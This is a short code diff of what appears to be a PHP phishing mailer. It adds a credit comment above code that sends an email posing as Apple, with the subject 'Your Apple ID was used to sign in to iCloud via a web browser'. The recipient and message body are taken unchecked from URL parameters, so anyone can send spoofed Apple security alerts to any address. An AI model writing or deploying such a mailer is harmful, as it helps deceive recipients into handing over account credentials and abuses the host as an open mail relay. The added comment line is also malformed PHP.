@@ -22,6 +22,9 @@
 
 <body bgcolor="black"> 
 <?php 
+/--------------------------
+//©Coder IrvanPramana @2019
+//--------------------------
 $name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; 
 $subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
 $body = $_GET ['pesan'];
